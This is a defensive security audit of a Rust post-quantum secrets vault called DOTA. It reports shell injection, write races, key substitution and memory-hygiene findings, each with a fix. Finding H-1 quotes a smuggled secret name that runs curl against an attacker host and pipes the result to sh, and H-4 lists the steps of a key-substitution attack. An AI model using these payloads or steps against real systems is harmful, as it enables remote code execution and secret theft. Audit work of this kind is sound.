# DOTA Security & Runtime Audit Report

**Audited**: 2026-02-13
**Scope**: Full source review of `src/` (1,969 lines Rust)
**Build verification**: Unable to compile (no network for crate downloads); all findings are from static analysis.

---

## Summary

| Severity | Count |
|----------|-------|
| HIGH     | 4     |
| MEDIUM   | 6     |
| LOW      | 3     |

The cryptographic algorithm selection is sound (ML-KEM-768 + X25519 + AES-256-GCM + Argon2id). Most findings relate to implementation-level memory hygiene, file I/O safety, and missing integrity checks rather than cryptographic design errors.

---

## HIGH Severity

### H-1: TUI `export` command lacks shell variable name validation

**Location**: `src/tui/mod.rs:120-126`

The CLI `export-env` command (`src/cli/export.rs:24-30`) correctly validates secret names with `is_shell_var_name()` before interpolating them into `export NAME=VALUE` output. However, the TUI interactive `export` command skips this validation entirely:

```rust
// tui/mod.rs:120-126 — no validation on `name`
"export" => {
    for name in list_secrets(&unlocked) {
        if let Ok(value) = get_secret(&unlocked, &name) {
            println!("export {}={}", name, shell_escape(&value));
        }
    }
}
```

A secret stored with a name like `FOO$(whoami)` or `X;curl attacker.com/shell|sh` is a valid `HashMap<String, ...>` key. When the user pipes TUI export output through `eval` or `source`, the unvalidated name is executed as shell code. The value is properly escaped, but the **name** is not.

**Impact**: Shell command injection when TUI export output is eval'd.

**Fix**: Apply the same `is_shell_var_name()` check from `cli/export.rs` before emitting each line, or extract it into a shared function.

---

### H-2: Non-atomic vault file writes risk data loss

**Location**: `src/vault/ops.rs:93-94` (create), `src/vault/ops.rs:361-362` (save)

Both `create_vault` and `save_vault` use `fs::write()` which truncates the file, then writes the new content. If the process is killed, the system loses power, or the disk fills mid-write, the vault file is left in a truncated/corrupted state with all secrets lost.

```rust
// ops.rs:361-362
let json = serde_json::to_string_pretty(&unlocked.vault)?;
fs::write(&unlocked.path, json)?;  // NOT atomic
```

**Impact**: Vault corruption and total data loss on crash during any write operation (set, rm, change-passphrase, rotate-keys).

**Fix**: Write to a temporary file in the same directory, then `rename()` (which is atomic on POSIX filesystems):
```rust
let tmp_path = format!("{}.tmp", unlocked.path);
fs::write(&tmp_path, &json)?;
fs::set_permissions(&tmp_path, ...)?;
fs::rename(&tmp_path, &unlocked.path)?;
```

---

### H-3: TOCTOU race in vault file permissions

**Location**: `src/vault/ops.rs:93-99` (create), `src/vault/ops.rs:361-367` (save)

The vault file is created with `fs::write()` (using default permissions, typically 0o644 governed by umask), and then permissions are set to 0o600 in a separate step:

```rust
fs::write(vault_path, json)?;          // File created with default perms
// ... window where file is world-readable ...
let mut perms = fs::metadata(vault_path)?.permissions();
perms.set_mode(0o600);
fs::set_permissions(vault_path, perms)?; // Now restricted
```

Between creation and `set_permissions`, the file exists with potentially world-readable permissions. A concurrent process or user could read the vault contents.

**Impact**: Brief exposure of vault file contents to other users on the system.

**Fix**: Use `std::fs::OpenOptions` with `mode()` on Unix, or set the process umask to `0o077` before writing. Combining with H-2's atomic-rename fix eliminates this entirely (temp file gets correct perms before being renamed into place).

---

### H-4: No integrity protection on vault metadata enables key substitution

**Location**: Vault format (`src/vault/format.rs`), unlock (`src/vault/ops.rs:105-158`)

The vault JSON file has no MAC or signature over its structure. The encrypted private keys are authenticated by AES-GCM, but the **public keys**, **KDF parameters**, and **algorithm fields** are stored in plaintext with no integrity check.

An attacker with write access to the vault file can:

1. Generate their own ML-KEM and X25519 keypairs
2. Set weak KDF parameters (t=1, m=8, p=1) and a known salt
3. Derive a master key from any passphrase using the weak params
4. Encrypt their private keys under this weak master key
5. Replace the vault's `kem.public_key`, `x25519.public_key`, KDF section, and encrypted private keys

The user's **existing secrets become unreadable** (encrypted under old keys), but any **new secrets** added with `set` are encrypted under the attacker's public keys. The attacker can later decrypt these new secrets with their private keys.

**Impact**: An attacker with filesystem write access can silently capture all newly-added secrets. Existing secrets are destroyed (a detectable side effect).

**Fix**: Add an HMAC over the vault metadata (version, KDF params, public keys) keyed by the master key. Verify this HMAC during unlock before trusting any vault fields.

---

## MEDIUM Severity

### M-1: Passphrase retained in memory as non-zeroizing `String` during TUI session

**Location**: `src/tui/mod.rs:16-17`

```rust
let passphrase = prompt_password("Vault passphrase: ")?;
let mut unlocked = unlock_vault(&passphrase, &vault_path)?;
```

The `passphrase` variable is a `String` that lives for the entire TUI session (needed for the `refresh` command at line 128). `String` does not implement `Zeroize`, so the passphrase remains in heap memory until the allocator reuses the page. It may be written to swap, included in core dumps, or recovered via memory forensics.

**Impact**: Passphrase exposed in memory for the duration of the interactive session.

**Fix**: Convert passphrase to a `zeroize::Zeroizing<String>` wrapper immediately after prompt. For `refresh`, derive and store the master key instead of the raw passphrase.

---

### M-2: Intermediate key material not zeroized in multiple locations

Several functions create temporary buffers holding secret key material that are not zeroized when they go out of scope:

| Location | Variable | Content |
|----------|----------|---------|
| `src/crypto/hybrid.rs:77-79` | `ikm: Vec<u8>` | Concatenated ML-KEM + X25519 shared secrets (64 bytes) |
| `src/crypto/mlkem.rs:97-98` | `ss_bytes: [u8; 32]` | ML-KEM shared secret (encapsulate) |
| `src/crypto/mlkem.rs:119-120` | `ss_bytes: [u8; 32]` | ML-KEM shared secret (decapsulate) |
| `src/crypto/x25519.rs:81` | `shared_bytes: [u8; 32]` | X25519 DH output |
| `src/crypto/kdf.rs:69` | `output: [u8; 32]` | Argon2id-derived master key |
| `src/vault/ops.rs:130-136` | `mlkem_sk_bytes: Vec<u8>` | Decrypted ML-KEM private key |
| `src/vault/ops.rs:139-150` | `x25519_sk_bytes: Vec<u8>` | Decrypted X25519 private key |

The final types (`MlKemSharedSecret`, `X25519SharedSecret`, `MasterKey`, etc.) all correctly implement `ZeroizeOnDrop`, but the **intermediate copies** that exist during construction do not get zeroized.

**Impact**: Secret key material lingers in stack/heap memory after function returns. Recoverable via memory forensics, swap analysis, or core dumps.

**Fix**: Wrap intermediates in `zeroize::Zeroizing<Vec<u8>>` or manually call `zeroize()` on stack arrays before returning.

---

### M-3: Secret values visible in process arguments

**Location**: `src/cli/mod.rs:30-35`

```rust
Set {
    name: String,
    value: Option<String>,  // accepted as CLI arg
},
```

Running `dota set API_KEY sk-live-abc123` exposes the secret value in:
- `ps aux` output visible to all users
- `/proc/<pid>/cmdline` on Linux
- Shell history files (`~/.bash_history`, `~/.zsh_history`)

The CLI does offer a prompt fallback when `value` is `None`, but the argument option remains available.

**Impact**: Secrets leaked to shell history and process listing.

**Fix**: Remove the `value` argument entirely and always prompt via `rpassword`. Alternatively, add support for reading from stdin (`echo "val" | dota set KEY`).

---

### M-4: Vault parent directory created with default permissions

**Location**: `src/vault/ops.rs:88-89`

```rust
if let Some(parent) = Path::new(vault_path).parent() {
    fs::create_dir_all(parent)?;
}
```

`create_dir_all` creates `~/.dota/` with the default permission mode (typically 0o755 based on umask). This means other users on the system can list the directory contents and see that a vault file exists, even though they can't read the file itself.

**Impact**: Information disclosure — other users can detect the presence of a vault and observe file modification times.

**Fix**: After creation, set the directory permissions to 0o700:
```rust
fs::create_dir_all(parent)?;
fs::set_permissions(parent, fs::Permissions::from_mode(0o700))?;
```

---

### M-5: Decrypted secret plaintexts not zeroized during key rotation

**Location**: `src/vault/ops.rs:242-252`

```rust
let mut secrets: Vec<(String, String, chrono::DateTime<Utc>)> = Vec::with_capacity(existing_names.len());
for name in &existing_names {
    let plaintext = get_secret(unlocked, name)?;
    secrets.push((name.clone(), plaintext, entry.created));
}
```

During key rotation, **all** secret plaintexts are decrypted and held simultaneously in a `Vec<(String, String, ...)>`. These `String` values are not zeroized after re-encryption completes (lines 287-303). For vaults with many secrets, this creates a large window where all plaintext secrets exist in memory.

**Impact**: All vault secrets simultaneously exposed in heap memory during rotation. Recoverable via memory forensics or crash dumps.

**Fix**: Process secrets one at a time (decrypt, re-encrypt, zeroize, move to next), or wrap the plaintext `String` in `Zeroizing<String>`.

---

### M-6: KDF parameters from vault file not validated against minimum thresholds

**Location**: `src/vault/ops.rs:120-125`

```rust
let kdf_config = KdfConfig {
    salt: vault.kdf.salt.clone(),
    time_cost: vault.kdf.time_cost,      // no minimum check
    memory_cost: vault.kdf.memory_cost,    // no minimum check
    parallelism: vault.kdf.parallelism,    // no minimum check
};
```

KDF parameters are read directly from the vault file with no validation against minimum acceptable values. While modifying these doesn't help an attacker decrypt *existing* secrets (see H-4 discussion), it means a vault created by a modified or buggy client with `time_cost=1, memory_cost=8` would be accepted silently on unlock.

Combined with H-4, if an attacker performs a full key substitution, they can set arbitrarily weak KDF parameters that will be accepted without warning.

**Impact**: Silently accepts dangerously weak KDF parameters.

**Fix**: Enforce minimum thresholds on unlock (e.g., `time_cost >= 2, memory_cost >= 19456, parallelism >= 1` matching OWASP minimums) and warn or refuse if they're not met.

---

## LOW Severity

### L-1: `home_dir()` fallback to current directory

**Location**: `src/vault/ops.rs:18-20`

```rust
pub fn default_vault_path() -> String {
    dirs::home_dir()
        .unwrap_or_else(|| std::path::PathBuf::from("."))
```

If `HOME` is not set (e.g., in some containerized or `su` environments), the vault defaults to `./dota/vault.json` relative to the current working directory. This could place the vault in a world-readable location (e.g., `/tmp`) or in a location the user doesn't expect.

**Fix**: Fail with an explicit error if `home_dir()` returns `None`.

---

### L-2: `to_string_lossy()` may silently corrupt non-UTF-8 paths

**Location**: `src/vault/ops.rs:22-23`

```rust
    .to_string_lossy()
    .to_string()
```

On systems with non-UTF-8 filenames in the home directory path, `to_string_lossy()` replaces invalid bytes with U+FFFD (`�`). This would cause the vault path to be silently wrong — the vault could be written to a different path than intended or fail to be found on subsequent runs.

**Fix**: Use `OsString`/`PathBuf` throughout instead of converting to `String`, or fail explicitly on non-UTF-8 paths.

---

### L-3: No application-level rate limiting on passphrase attempts

**Location**: Overall design

There is no lockout mechanism, delay, or attempt counter for failed passphrase attempts. While Argon2id's computational cost (64 MiB, 3 iterations) provides ~0.5-1s per attempt, a local attacker can still run unlimited parallel attempts using `unlock_vault()`.

**Impact**: Minimal additional risk beyond Argon2id's built-in cost — this is standard for local vaults. Mentioned for completeness.

---

## Positive Findings

The audit also identified several **well-implemented** security measures:

- **Zeroize on all primary key types**: `MasterKey`, `MlKemPrivateKey`, `MlKemSharedSecret`, `X25519PrivateKey`, `X25519SharedSecret`, `AesKey` all use `#[derive(Zeroize, ZeroizeOnDrop)]`
- **X25519 all-zero rejection**: `diffie_hellman()` correctly rejects all-zero DH outputs (small-subgroup defense)
- **ML-KEM length validation**: All KEM types validate expected byte lengths at construction
- **Per-secret ephemeral keys**: Each secret gets a fresh X25519 ephemeral keypair, preventing key reuse
- **Proper shell escaping**: `cli/export.rs` validates variable names AND escapes values
- **HKDF domain separation**: Uses both a fixed protocol salt and context string
- **Argon2id parameters**: Meet OWASP 2024 recommended values (t=3, m=64MiB, p=4)
- **Hybrid KEM design**: GHP combiner provides IND-CCA2 security if either component is secure
